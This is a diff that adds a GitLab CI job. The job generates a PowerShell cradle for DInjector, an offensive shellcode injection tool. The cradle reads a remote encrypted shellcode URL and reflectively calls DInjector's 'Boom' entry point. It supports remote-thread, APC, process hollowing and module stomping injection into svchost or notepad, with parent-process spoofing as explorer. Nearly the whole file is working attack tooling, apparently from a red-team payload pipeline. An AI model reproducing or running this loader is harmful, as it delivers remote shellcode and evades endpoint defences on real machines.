@@ -1,0 +1,39 @@
+# Taken from DInjector cradle example https://github.com/snovvcrash/DInjector/blob/main/cradle.ps1
+variables:
+  DINJECTOR_EXEC_PATH: $SHELLCODE_FILE_PATH-enc-exec-$SHELLCODE_INJECTION_TECHNIQUE.ps1
+gen_shellcode_injection:
+  only:
+    variables:
+     - $CI_ENCRYPTERS =~ /^.*(DInjectorEncrypt).*$/
+     - $CI_EXECUTORS =~ /^.*(shellcode-injection).*$/
+     - $SHELLCODE_INJECTION_TECHNIQUE =~ /^(functionpointer|functionpointerv2|clipboardpointer|currentthread|currentthreaduuid|remotethread|remotethreaddll|remotethreadview|remotethreadsuspended|remotethreadkernelcb|remotethreadapc|remotethreadcontext|processhollow)$/
+  stage: exec
+  image: gcr.io/$GCP_PROJECT_ID/linuxutils:latest
+  tags: 
+   - kubernetes
+   - linux
+  script:
+    - mkdir -p deploy_dir
+    - SC="\" + \$encBinUrl + \""
+    - F=$(cat deploy_dir/$SHELLCODE_FILE_PATH-enc.key) # Relies on the DIjector encrpytion usage
+    - G="C:\Windows\System32\svchost.exe" # path to the image of a newly spawned process to inject into (used in "remotethreadapc", "remotethreadcontext", "processhollow" and "modulestomping")
+    - H="notepad" # existing process name to inject into (used in "remotethread", "remotethreaddll", "remotethreadview", "remotethreadsuspended","remotethreadkernelcb")
+    - if [[ "$SHELLCODE_INJECTION_TECHNIQUE" =~ ^(remotethread|remotethreaddll|remotethreadview|remotethreadsuspended|remotethreadkernelcb)$ ]]; then H='(Start-Process -WindowStyle Hidden -PassThru '$H').Id' ; fi
+    - I="explorer" # parent process name to spoof the original value (use "0" to disable PPID spoofing) (used in "remotethreadapc", "remotethreadcontext", "processhollow" and "modulestomping")
+    - if [[ "$SHELLCODE_INJECTION_TECHNIQUE" =~ ^(remotethreadapc|remotethreadcontext|processhollow|modulestomping)$ ]]; then I='(Get-Process '$I' -ErrorAction Stop).Id' ; fi
+    - J="msvcp_win.dll" # loaded module (DLL) name to overwrite its .text section for storing the shellcode (used in "remotethreaddll")
+    - K="xpsservices.dll" # name of the module (DLL) to stomp (used in "modulestomping")
+    - L="DllCanUnloadNow" # exported function to overwrite (used in "modulestomping")
+    - CMD="$SHELLCODE_INJECTION_TECHNIQUE /sc:$SC /password:$F /image:$G /pid:$H /ppid:$I /dll:$J /stomp:$K /export:$L /blockDlls:True /am51:False"
+    - echo '$encBinUrl -eq $null -and ($encBinUrl = Read-Host encBinUrl)' >> $DINJECTOR_EXEC_PATH
+    - echo '$flags = [Reflection.BindingFlags] "NonPublic,Static"' >> $DINJECTOR_EXEC_PATH
+    - echo '$class = $asm.GetType("DInjector.Detonator", $flags)' >> $DINJECTOR_EXEC_PATH
+    - echo '$entry = $class.GetMethod("Boom", $flags)' >> $DINJECTOR_EXEC_PATH
+    - echo '$cmd = '\"$CMD\" >> $DINJECTOR_EXEC_PATH
+    - echo '$entry.Invoke($null, (, $cmd.Split(" ")))' >> $DINJECTOR_EXEC_PATH
+    - cp $DINJECTOR_EXEC_PATH deploy_dir/
+  artifacts:
+    paths: 
+      - $DINJECTOR_EXEC_PATH
+      - deploy_dir
+    expire_in: 1 week
